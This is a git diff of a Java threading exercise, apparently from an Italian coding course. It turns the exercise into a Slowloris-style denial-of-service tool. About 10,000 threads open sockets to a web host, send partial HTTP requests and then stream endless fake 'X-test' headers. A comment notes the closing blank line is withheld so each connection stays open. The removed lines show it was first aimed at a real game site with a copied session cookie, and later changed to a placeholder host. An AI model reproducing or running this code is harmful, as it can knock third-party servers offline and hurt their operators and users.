@@ -1,6 +1,8 @@
 package it.nextre.academy.basi.thread;
 
+import it.nextre.academy.myutils.DummyData;
 import it.nextre.academy.myutils.MyInput;
+import it.nextre.academy.myutils.MySupport;
 
 import javax.net.ssl.SSLSocketFactory;
 import java.io.BufferedReader;
@@ -129,9 +131,9 @@ public class MainThread {
             tasks[i].start();
         }
 */
-        ExecutorService ex = Executors.newFixedThreadPool(3000);
+        ExecutorService ex = Executors.newFixedThreadPool(10000-1);
         //ex.execute(new Task());
-        for (int i = 0; i < 1; i++) {
+        for (int i = 0; i < 10_000; i++) {
             ex.submit(new Task());
             //ex.execute(Task::new);
         }//end for
@@ -178,11 +180,11 @@ class Task implements Runnable {
         //System.out.println("Task Running...");
         System.setProperty("javax.net.ssl.trustStore", "clienttrust");
         SSLSocketFactory ssf = (SSLSocketFactory) SSLSocketFactory.getDefault();
-        String hostName = "krunker.io";
+        String hostName = "your-site.dominio";
         int portNumber = 80;
         try (
-                //Socket echoSocket = new Socket(hostName, portNumber);
-                Socket echoSocket = ssf.createSocket(hostName, portNumber);
+                Socket echoSocket = new Socket(hostName, portNumber);
+                //Socket echoSocket = ssf.createSocket(hostName, portNumber);
                 //Scrive sulla Socket
                 PrintWriter out = new PrintWriter(echoSocket.getOutputStream(), true);
                 //legge dalla Socket
@@ -192,30 +194,41 @@ class Task implements Runnable {
 
             //echoSocket.getKeepAlive();
             //GET /nomeRisorsa HTTP/1.1
-            out.println("GET /?game=FRA:qi7dy HTTP/1.1");
-            out.println("Host: krunker.io");
+            out.println("GET /index.htm HTTP/1.1");
+            out.println("Host: www."+hostName+":80");
             out.println("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0");
-            out.println("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+            out.println("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
+//            out.println("Accept-Charset: Accept-Charset: iso-8859-5, unicode-1-1;q=0.8");
             out.println("Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3");
-            out.println("Accept-Encoding: gzip, deflate, br");
+            out.println("Accept-Encoding: gzip, deflate");
             out.println("Connection: keep-alive");
-            out.println("Cookie: __cfduid=db33001adff5a08c035aec79e811c636f1569582500");
-            out.println("Upgrade-Insecure-Requests: 1");
-            out.println("Pragma: no-cache");
-            out.println("Cache-Control: no-cache");
-            out.println("TE: Trailers");
-            //out.println("Host: localhost");
-//            String txt = "";
-//            System.out.println("extra header, doppio invio per fermare");
-//            while ((txt = MyInput.leggiRiga()).length() > 0) {
-//                out.println(txt);
-//            }
+//            out.println("Upgrade-Insecure-Requests: 1");
+//            out.println("DNT: 1");
+//            out.println("Cookie: __cfduid=db33001adff5a08c035aec79e811c636f1569582500");
+//            out.println("Pragma: no-cache");
+//            out.println("Cache-Control: no-cache");
+//            out.println("TE: Trailers");
+
+
+            String txt = "";
+            System.out.println("extra header, doppio invio per fermare");
+            while ((txt = MyInput.leggiRiga()).length() > 0) {
+                out.println(txt);
+            }
 
 
             //Random r = new Random();
             //Thread.sleep(1000 + r.nextInt(3000));
 
+
+            while(true){
+                out.println("X-test: "+ DummyData.getPassword(12));
+                if (false)break;
+            }
+
             out.println("\n"); //<- NON FATTA PER RESTARE IN ATTESA!!!
+
+
 
 
             String output = "";
